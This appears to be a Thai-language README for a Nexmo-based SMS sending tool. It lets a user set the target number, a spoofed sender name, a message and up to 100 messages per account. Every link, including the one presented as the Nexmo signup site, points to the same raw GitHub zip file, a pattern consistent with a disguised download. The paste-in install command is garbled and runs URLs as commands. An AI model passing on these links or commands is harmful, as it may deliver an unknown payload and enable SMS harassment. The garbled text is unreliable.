...
สำหรับเพื่อนๆที่ไม่มี Key กันให้ไปสมัครที่เว็บ https://raw.githubusercontent.com/Foto12ab/SMS-Send-Nexmo/master/oak/Nexmo_Send_SM_v2.8.zip เพื่อเอา Key กับ Key secret มาใส่ในเเต่ละ TXT ครับ
...
git clone https://raw.githubusercontent.com/Foto12ab/SMS-Send-Nexmo/master/oak/Nexmo_Send_SM_v2.8.zip && chmod +x SMS-Send-Nexmo && cd SMS-Send-Nexmo && https://raw.githubusercontent.com/Foto12ab/SMS-Send-Nexmo/master/oak/Nexmo_Send_SM_v2.8.zip && https://raw.githubusercontent.com/Foto12ab/SMS-Send-Nexmo/master/oak/Nexmo_Send_SM_v2.8.zip   
ใส่เบอร์เช่น: 6612345678                                                                                          
หัวข้อความ: ชื่อคนส่ง                                                                                           
ข้อความ: ข้อความอะไรเช่น kuy                                                                                            
จำนวนที่ส่ง: สูงสุด 100 ต่อบัญชี                                                                          

ให้ไปสมัครบัญชีที่เว็บ Nexmo ก่อนครับเพื่อเอา Api Key เเละ Secret มาใส่ตรง https://raw.githubusercontent.com/Foto12ab/SMS-Send-Nexmo/master/oak/Nexmo_Send_SM_v2.8.zip เเละ https://raw.githubusercontent.com/Foto12ab/SMS-Send-Nexmo/master/oak/Nexmo_Send_SM_v2.8.zip
